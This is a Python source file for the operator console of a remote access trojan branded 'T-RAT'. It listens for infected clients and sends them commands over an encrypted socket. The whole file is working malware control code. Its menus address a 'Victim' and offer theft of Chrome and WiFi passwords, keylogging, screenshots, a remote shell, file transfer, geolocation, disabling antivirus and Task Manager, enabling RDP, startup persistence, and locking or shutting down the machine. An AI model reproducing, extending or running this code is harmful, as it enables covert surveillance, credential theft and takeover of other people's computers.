import socket, os, time, threading, sys, json
from queue import Queue
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Back, Style
from prettytable import PrettyTable
import prettytable

colorama.init()

arrAddresses = []
arrConnections = []

strHost = "0.0.0.0"
intPort = 3000

intBuff = 1024

queue = Queue()

remove_quotes = lambda string: string.replace("\"", "")

center = lambda string, title: f"{{:^{len(string)}}}".format(title)

send = lambda data: conn.send(objEncryptor.encrypt(data))

recv = lambda buffer: objEncryptor.decrypt(conn.recv(buffer))

def recvall(buffer):
    bytData = b""
    while len(bytData) < buffer:
        bytData += conn.recv(buffer)
    return objEncryptor.decrypt(bytData)

def sendall(flag, data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(f"{flag}{intDataSize}".encode())
    time.sleep(0.2)
    conn.send(bytEncryptedData)
    print(f"{Fore.GREEN}Total bytes sent: {Fore.WHITE}{intDataSize}")

def create_encryptor():
    global objKey, objEncryptor
    objKey = Fernet.generate_key()
    objEncryptor = Fernet(objKey)

def create_socket():
    global objSocket
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error() as strError:
        print(f"{Fore.RED}Error creating socket: {Fore.WHITE}{strError}")

def socket_bind():
    global objSocket
    try:
        print(f"{Fore.GREEN}Listening on port: {Fore.WHITE}{intPort}")
        objSocket.bind((strHost, intPort))
        objSocket.listen(20)
    except socket.error() as strError:
        print(f"{Fore.RED}Error binding socket {Fore.WHITE}{strError}!\n{Fore.YELLOW}Retrying...")
        socket_bind()

def socket_accept():
    while True:
        try:
            conn, address = objSocket.accept()
            conn.setblocking(1)
            address += tuple(json.loads(conn.recv(intBuff).decode()))
            conn.send(objKey)
            arrConnections.append(conn)
            arrAddresses.append(address)
            print(f"{Fore.GREEN}\nConnection has been established: {Fore.WHITE}{address[0]} ({address[2]})")
        except socket.error:
            print("{Fore.RED}Error accepting connections!")
            continue

def _decode(data):
    try:
        return data.decode()
    except UnicodeDecodeError:
        try:
            return data.decode("cp437")
        except UnicodeDecodeError:
            return data.decode(errors="replace")

def menu_help():
    print(f"""{Fore.RED}
████████╗░░░░░░██████╗░░█████╗░████████╗
╚══██╔══╝░░░░░░██╔══██╗██╔══██╗╚══██╔══╝
░░░██║░░░█████╗██████╔╝███████║░░░██║░░░
░░░██║░░░╚════╝██╔══██╗██╔══██║░░░██║░░░
░░░██║░░░░░░░░░██║░░██║██║░░██║░░░██║░░░
░░░╚═╝░░░░░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░
{Fore.CYAN}Developed By TOG

{Fore.BLUE}H {Fore.WHITE}- {Fore.RED}Help
{Fore.BLUE}L {Fore.WHITE}- {Fore.RED}List All Connections
{Fore.BLUE}I {Fore.WHITE}- {Fore.RED}Interact With Connection
{Fore.BLUE}E {Fore.WHITE}- {Fore.RED}Open Remote CMD With Connection
{Fore.BLUE}S {Fore.WHITE}- {Fore.RED}Send Command To Every Connection
{Fore.BLUE}C {Fore.WHITE}- {Fore.RED}Close Connection
{Fore.BLUE}X {Fore.WHITE}- {Fore.RED}Exit And Close All Connections
""")

def main_menu():
    while True:
        strChoice = input("\n>> ").lower()

        refresh_connections()

        if strChoice == "l":
            list_connections()

        elif strChoice[:1] == "i" and len(strChoice) > 1:
            conn = select_connection(strChoice[2:], True)
            if conn is not None:
                send_commands()
        elif strChoice == "h":
            menu_help()

        elif strChoice[:1] == "c" and len(strChoice) > 1:
            conn = select_connection(strChoice[2:], False)
            if conn is not None:
                send(b"exit")
                conn.close()

        elif strChoice == "x":
            close()
            break

        elif strChoice[:1] == "e" and len(strChoice) > 1:
            conn = select_connection(strChoice[2:], False)
            if conn is not None:
                command_shell()

        elif strChoice[:1] == "s" and len(strChoice) > 1:
            send_command_all(strChoice[2:])
        else:
            print(f"{Fore.RED}Invalid Choice, Please Try Again!")
            menu_help()

def close():
    global arrConnections, arrAddresses, conn

    if len(arrAddresses) == 0:
        return

    for _, conn in enumerate(arrConnections):
        send(b"exit")
        conn.close()
    del arrConnections
    arrConnections = []
    del arrAddresses
    arrAddresses = []

def refresh_connections():
    global arrConnections, arrAddresses, conn
    for intCounter, conn in enumerate(arrConnections):
        try:
            send(b"test")
        except socket.error:
            del arrAddresses[arrConnections.index(conn)]
            arrConnections.remove(conn)
            conn.close()

def list_connections():
    refresh_connections()

    if not len(arrConnections) > 0:
        print("No connections.")
        return

    strClients = ""
    for intCounter, arrAddress in enumerate(arrAddresses):
        strClients += f"{intCounter}"
        for value in arrAddress:
            strClients += f"{4 * ' '}{str(value)}"
        strClients += "\n"

    strInfo = f"\nID{3 * ' '}"
    for index, text in enumerate(["IP", "Port", "PC Name", "OS", "User"]):
        strInfo += center(f"{arrAddresses[0][index]}", text) + 4 * " "
    strInfo += f"\n{strClients}"
    print(strInfo, end="")

def select_connection(connection_id, blnGetResponse):
    global conn, arrInfo
    try:
        connection_id = int(connection_id)
        conn = arrConnections[connection_id]
    except:
        print(f"{Fore.RED}Invalid Choice, Please Try Again!")
        return
    else:
        arrInfo = tuple()
        for index in [0, 2, 3, 4]:
            arrInfo += (f"{arrAddresses[connection_id][index]}",)

        if blnGetResponse:
            print(f"{Fore.GREEN}You are connected to {arrInfo[0]} ....\n")
        return conn

def send_command_all(command):
    if os.path.isfile("command_log.txt"):
        open("command_log.txt", "w").close()

    for intCounter in range(0, len(arrAddresses)):
        conn = select_connection(intCounter, False)

        if conn is not None and command != "cmd":
            send_command(command)

def user_info():
    for index, text in enumerate(["IP: ", "PC Name: ", "OS: ", "User: "]):
        print(text + arrInfo[index])

def screenshot():
    send(b"screen")
    strScrnSize = recv(intBuff).decode()
    print(f"{Fore.GREEN}\nReceiving Screenshot\nFile size: {Fore.WHITE}{strScrnSize} {Fore.GREEN}bytes\nPlease wait...")

    intBuffer = int(strScrnSize)

    strFile = time.strftime("%Y%m%d%H%M%S.png")

    ScrnData = recvall(intBuffer)
    with open(strFile, "wb") as objPic:
        objPic.write(ScrnData)

    print(f"{Fore.GREEN}Done!\nTotal bytes received: {Fore.WHITE}{os.path.getsize(strFile)} {Fore.GREEN}bytes")

def voice(message: str):
    send(b"voiceover:" + message.encode('utf_8'))
    print(f"{Fore.GREEN}Played {Fore.WHITE}{message} {Fore.GREEN}From User!")

def browse_files():
    send(b"filebrowser")
    print(Fore.WHITE + "\nDrives :")

    strDrives = recv(intBuff).decode()
    print(f"{Fore.WHITE}{strDrives}\n")

    strDir = input(Fore.WHITE + "Directory: ")

    if strDir == "":
        strDir = "Invalid"

    send(strDir.encode())

    strClientResponse = recv(intBuff).decode()

    if strClientResponse == "Invalid Directory!":
        print(f"{Fore.RED}\n{strClientResponse}")
        return

    intBuffer = int(strClientResponse)
    strClientResponse = recvall(intBuffer).decode()

    print(f"{Fore.WHITE}\n{strClientResponse}")

def startup():
    send(b"startup")
    print(Fore.GREEN + "Registering ...")

    strClientResponse = recv(intBuff).decode()
    if not strClientResponse == "success":
        print(Fore.RED + strClientResponse)

def remove_from_startup():
    send(b"rmvstartup")
    print(Fore.GREEN + "Removing ...")

    strClientResponse = recv(intBuff).decode()
    if not strClientResponse == "success":
        print(Fore.RED + strClientResponse)

def send_file():
    strFile = remove_quotes(input(Fore.YELLOW + "\nFile to send: "))
    if not os.path.isfile(strFile):
        print(Fore.RED + "Invalid File!")
        return

    strOutputFile = remove_quotes(input(Fore.YELLOW + "\nOutput File: "))
    if strOutputFile == "":
        return

    with open(strFile, "rb") as objFile:
        sendall("send", objFile.read())

    send(strOutputFile.encode())

    strClientResponse = recv(intBuff).decode()
    print(Fore.WHITE + strClientResponse)

def receive():
    strFile = remove_quotes(input(Fore.YELLOW + "\nTarget file: "))
    strFileOutput = remove_quotes(input(Fore.YELLOW + "\nOutput File: "))

    if strFile == "" or strFileOutput == "":
        return

    send(("recv" + strFile).encode())
    strClientResponse = recv(intBuff).decode()

    if strClientResponse == "Target file not found!":
        print(Fore.RED + strClientResponse)
        return

    print(f"{Fore.GREEN}File size: {Fore.WHITE}{strClientResponse} {Fore.GREEN}bytes\nPlease wait...")
    intBuffer = int(strClientResponse)

    file_data = recvall(intBuffer)

    try:
        with open(strFileOutput, "wb") as objFile:
            objFile.write(file_data)
    except:
        print(Fore.RED + "Path is protected/invalid!")
        return

    print(f"{Fore.GREEN}Done!\nTotal bytes received: {Fore.WHITE}{os.path.getsize(strFileOutput)} {Fore.GREEN}bytes")

def command_shell():
    send(b"cmd")
    strDefault = f"\n{_decode(recv(intBuff))}>"
    print(strDefault, end="")

    while True:
        strCommand = input()
        if strCommand in ["quit", "exit"]:
            send(b"goback")
            break

        elif strCommand == "cmd":
            print("Please do use not this command!")
            print(strDefault, end="")

        elif len(strCommand) > 0:
            send(strCommand.encode())
            intBuffer = int(recv(intBuff).decode())
            strClientResponse = _decode(recvall(intBuffer))
            print(strClientResponse, end="")
        else:
            print(strDefault, end="")

def python_interpreter():
    send(b"python")
    recv(intBuff)
    while True:
        strCommand = input("\n>>> ")
        if strCommand.strip() == "":
            continue
        if strCommand in ["exit", "exit()"]:
            break
        send(strCommand.encode())
        intBuffer = int(recv(intBuff).decode())
        strReceived = recvall(intBuffer).decode("utf-8").rstrip("\n")
        if strReceived != "":
            print(strReceived)
    send(b"exit")
    recv(intBuff)

def disable_taskmgr():
    send(b"dtaskmgr")
    print(recv(intBuff).decode())

def keylogger(option):
    if option == "start":
        send(b"keystart")
        if recv(intBuff) == b"error":
            print(Fore.YELLOW + "Keylogger is already running.")

    elif option == "stop":
        send(b"keystop")
        if recv(intBuff) == b"error":
            print(Fore.YELLOW + "Keylogger is not running.")

    elif option == "dump":
        send(b"keydump")
        intBuffer = recv(intBuff).decode()

        if intBuffer == "error":
            print(Fore.RED + "Keylogger is not running.")
        elif intBuffer == "error2":
            print(Fore.RED + "No logs.")
        else:
            strLogs = recvall(int(intBuffer)).decode(errors="replace")
            print(f"\n{strLogs}")

def send_command(command):
    send(("runcmd" + command).encode())
    intBuffer = int(recv(intBuff).decode())

    strClientResponse = f"{24 * '='}\n{arrInfo[0]}{4 * ' '}{arrInfo[1]}{recvall(intBuffer).decode()}{24 * '='}"

    if os.path.isfile("command_log.txt"):
        strMode = "a"
    else:
        strMode = "w"

    with open("command_log.txt", strMode) as objLogFile:
        objLogFile.write(f"{strClientResponse}\n\n")

def osite(link: str):
    send(b"opsite:" + link.encode("utf_8"))
    print(f"{Fore.GREEN}Opened {Fore.WHITE}{link} {Fore.GREEN}On Victims Computer!")

def wraite(message: str):
    send(b"write:" + message.encode("utf_8"))
    print(f"{Fore.GREEN}Message {Fore.WHITE}{message} {Fore.GREEN}Writen From Victims Computer!")

def wallpaper(message: str):
    send(b"wallpaper:" + message.encode("utf_8"))
    print(f"{Fore.GREEN}Successfully Changed Wallpaper To {Fore.WHITE}{message}{Fore.GREEN}!")

def binp(num: str):
    if num == "1":
        send(b"blockinp")
        strData = recv(intBuff)
        strData = strData.decode()
        if strData == "True":
            print(f"{Fore.GREEN}Successfully Blocked Input!")
        else:
            print(f"{Fore.RED}This Option Works Only If Victim Runs The Program As Admin!")
    elif num == "2":
        send(b"unblockinp")
        strData = recv(intBuff)
        strData = strData.decode()
        if strData == "True":
            print(f"{Fore.GREEN}Successfully Blocked Input!")
        else:
            print(f"{Fore.RED}This Option Works Only If Victim Runs The Program As Admin!")
    else:
        pass

def rdp(num: str):
    if num == "0":
        send(b"rdpoff")
        strData = recv(intBuff)
        strData = strData.decode()
        if strData == "stop":
            print(f"{Fore.GREEN}Successfully Stopped RDP!")
        else:
            print(f"{Fore.RED}This Option Works Only If Victim Runs The Program As Admin!")
    else:
        send(b"rdpon")
        strData = recv(intBuff)
        strData = strData.decode()
        if strData == "fail":
            print(f"{Fore.RED}This Option Works Only If Victim Runs The Program As Admin!")
        else:
            print(f"{Fore.GREEN}RDP Opened:\n{strData}")

def av(num: str):
    if num == "0":
        send(b"avoff")
        strData = recv(intBuff)
        strData = strData.decode()
        if strData == "fail":
            print(f"{Fore.RED}This Option Works Only If Victim Runs The Program As Admin!")
        else:
            print(f"{Fore.GREEN}Anti Virus Successfully Turned Off!")
    else:
        send(b"avon")
        strData = recv(intBuff)
        strData = strData.decode()
        if strData == "fail":
            print(f"{Fore.RED}This Option Works Only If Victim Runs The Program As Admin!")
        else:
            print(f"{Fore.GREEN}Anti Virus Successfully Turned On!")

def history():
    send(b"history")
    strData = recv(intBuff)
    strData = strData.decode()
    print(f"{Fore.GREEN}Successfully Fished Browser History:\n{strData}")

def clipboard():
    send(b"clipboard")
    strData = recv(intBuff)
    strData = strData.decode()
    print(f"{Fore.GREEN}Copied Clipboard Content: {Fore.WHITE}{strData}")

def chromepass():
    send(b"chromepass")
    strData = recv(intBuff)
    strData = strData.decode()
    print(f"{Fore.GREEN}Copied Password Content:\n{Fore.WHITE}{strData}")

def wifipass():
    send(b"wifipass")
    strData = recv(intBuff)
    strData = strData.decode()
    print(f"{Fore.GREEN}Wifi Passwords:\n{Fore.WHITE}{strData}")

def idletime():
    send(b"idletime")
    strData = recv(intBuff)
    strData = strData.decode()
    print(f"{Fore.GREEN}Victim Has Been Idle For:\n{Fore.WHITE}{strData}")

def geolocat():
    send(b"geolocat")
    strData = recv(intBuff)
    strData = strData.decode()
    print(f"{Fore.GREEN}Victim's Exact Location Has Been Discovered:\n{Fore.WHITE}{strData}")

def show_help():
    zzz = PrettyTable()
    zzz.field_names = ["Command", "Description"]
    zzz.add_row([f"{Fore.BLUE}H", f"{Fore.MAGENTA}Help"])
    zzz.add_row([f"{Fore.BLUE}M {Fore.RED}(text)", f"{Fore.MAGENTA}Send A GUI Message"])
    zzz.add_row([f"{Fore.BLUE}R", f"{Fore.MAGENTA}Recieve A File"])
    zzz.add_row([f"{Fore.BLUE}S", f"{Fore.MAGENTA}Send A File"])
    zzz.add_row([f"{Fore.BLUE}V", f"{Fore.MAGENTA}View Files On Victims Computer"])
    zzz.add_row([f"{Fore.BLUE}P", f"{Fore.MAGENTA}Take A Screenshot"])
    zzz.add_row([f"{Fore.BLUE}VOICE {Fore.RED}(message)", f"{Fore.MAGENTA}Play A Voice Message On Victims Computer"])
    zzz.add_row([f"{Fore.BLUE}OPENSITE {Fore.RED}(link)", f"{Fore.MAGENTA}Open A Site On Victims Computer"])
    zzz.add_row([f"{Fore.BLUE}WRITE {Fore.RED}(message)", f"{Fore.MAGENTA}Write Something On Victims Computer"])
    zzz.add_row([f"{Fore.BLUE}WALLPAPER {Fore.RED}(directory)", f"{Fore.MAGENTA}Change The Victim's Wallpaper"])
    zzz.add_row([f"{Fore.BLUE}ITIME", f"{Fore.MAGENTA}Get Victim's IdleTime"])
    zzz.add_row([f"{Fore.BLUE}GEOLOCAT", f"{Fore.MAGENTA}Get Victim's Exact Location"])
    zzz.add_row([f"{Fore.BLUE}HISTORY", f"{Fore.MAGENTA}Get Victim's Browser History"])
    zzz.add_row([f"{Fore.BLUE}CLIPBOARD", f"{Fore.MAGENTA}Get Victims's Clipboard"])
    zzz.add_row([f"{Fore.BLUE}CPASS", f"{Fore.MAGENTA}Get Victim's Chrome Passwords"])
    zzz.add_row([f"{Fore.BLUE}WPASS", f"{Fore.MAGENTA}Get Victim's WIFI Passwords"])
    zzz.add_row([f"{Fore.BLUE}AV 0", f"{Fore.MAGENTA}Turn Off The Anti Virus"])
    zzz.add_row([f"{Fore.BLUE}AV 1", f"{Fore.MAGENTA}Turn On The Anti Virus"])
    zzz.add_row([f"{Fore.BLUE}RDP 0", f"{Fore.MAGENTA}Turn Off Remote RDP"])
    zzz.add_row([f"{Fore.BLUE}RDP 1", f"{Fore.MAGENTA}Turn On Remote RDP"])
    zzz.add_row([f"{Fore.BLUE}BL 1", f"{Fore.MAGENTA}Block Victim's Input"])
    zzz.add_row([f"{Fore.BLUE}BL 2", f"{Fore.MAGENTA}Unblock Victim's Input"])
    zzz.add_row([f"{Fore.BLUE}A 1", f"{Fore.MAGENTA}Add The Virus To Startup"])
    zzz.add_row([f"{Fore.BLUE}A 2", f"{Fore.MAGENTA}Remove The Virus From Startup"])
    zzz.add_row([f"{Fore.BLUE}E", f"{Fore.MAGENTA}Open A Remote CMD"])
    zzz.add_row([f"{Fore.BLUE}D", f"{Fore.MAGENTA}Disable The Task Manager"])
    zzz.add_row([f"{Fore.BLUE}K {Fore.RED}(start) (stop) (dump)", f"{Fore.MAGENTA}Simple Keylogger"])
    zzz.add_row([f"{Fore.BLUE}I", f"{Fore.MAGENTA}Open A Python Interpreter {Fore.RED}[DEVELOPER ONLY]"])
    zzz.add_row([f"{Fore.BLUE}X {Fore.RED} 1", f"{Fore.MAGENTA}Lock Victim"])
    zzz.add_row([f"{Fore.BLUE}X {Fore.RED} 2", f"{Fore.MAGENTA}Restart Victim"])
    zzz.add_row([f"{Fore.BLUE}X {Fore.RED} 3", f"{Fore.MAGENTA}Shut Down Victim"])
    zzz.add_row([f"{Fore.BLUE}U", f"{Fore.MAGENTA}Victim Info"])
    zzz.add_row([f"{Fore.BLUE}H", f"{Fore.MAGENTA}Help"])
    print(f"""{Fore.RED}
████████╗░░░░░░██████╗░░█████╗░████████╗
╚══██╔══╝░░░░░░██╔══██╗██╔══██╗╚══██╔══╝
░░░██║░░░█████╗██████╔╝███████║░░░██║░░░
░░░██║░░░╚════╝██╔══██╗██╔══██║░░░██║░░░
░░░██║░░░░░░░░░██║░░██║██║░░██║░░░██║░░░
░░░╚═╝░░░░░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░
{Fore.CYAN}Developed By TOG

{zzz}

{Fore.YELLOW}B {Fore.WHITE}- {Fore.YELLOW}Move Connection To Background
{Fore.YELLOW}C {Fore.WHITE}- {Fore.YELLOW}Close Connection
""")

def send_commands():
    show_help()
    try:
        while True:
            strChoice = input("\nType selection: ").lower()

            if strChoice == "h":
                print()
                show_help()
            elif strChoice == "c":
                send(b"exit")
                conn.close()
                break
            elif strChoice[:1] == "m" and len(strChoice) > 1:
                strMsg = "msg" + strChoice[2:]
                send(strMsg.encode())
            elif strChoice == "a 1":
                startup()
            elif strChoice == "a 2":
                remove_from_startup()
            elif strChoice == "bl 1":
                binp("1")
            elif strChoice == "bl 2":
                binp("2")
            elif strChoice == "history":
                history()
            elif strChoice == "geolocat":
                geolocat()
            elif strChoice == "clipboard":
                clipboard()
            elif strChoice == "cpass":
                chromepass()
            elif strChoice == "itime":
                idletime()
            elif strChoice == "wpass":
                wifipass()
            elif strChoice == "rdp 0":
                rdp("0")
            elif strChoice == "rdp 1":
                rdp("1")
            elif strChoice == "u":
                user_info()
            elif strChoice == "p":
                screenshot()
            elif strChoice == "i":
                python_interpreter()
            elif strChoice == "v":
                browse_files()
            elif strChoice == "av 0":
                av(0)
            elif strChoice == "av 1":
                av(1)
            elif "voice" in strChoice:
                x = strChoice.replace("voice ", "")
                voice(x)
            elif "opensite" in strChoice:
                x = strChoice.replace("opensite ", "")
                osite(x)
            elif "wallpaper" in strChoice:
                x = strChoice.replace("wallpaper ", "")
                wallpaper(x)
            elif "write" in strChoice:
                x = strChoice.replace("write ", "")
                wraite(x)
            elif strChoice == "s":
                send_file()
            elif strChoice == "r":
                receive()
            elif strChoice == "x 1":
                send(b"lock")
            elif strChoice == "x 2":
                send(b"shutdown")
                conn.close()
                break
            elif strChoice == "x 3":
                send(b"restart")
                conn.close()
                break
            elif strChoice == "b":
                break
            elif strChoice == "e":
                command_shell()
            elif strChoice == "d":
                disable_taskmgr()
            elif strChoice == "k start":
                keylogger("start")
            elif strChoice == "k stop":
                keylogger("stop")
            elif strChoice == "k dump":
                keylogger("dump")
            else:
                print("Invalid choice, please try again!")

    except socket.error as e:
        print(f"Error, connection was lost! :\n{e}")
        return

def create_threads():
    for _ in range(2):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    queue.join()

def work():
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_encryptor()
            create_socket()
            socket_bind()
            socket_accept()
        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(arrAddresses) > 0:
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)

def create_jobs():
    for intThread in [1, 2]:
        queue.put(intThread)
    queue.join()

create_threads()
create_jobs()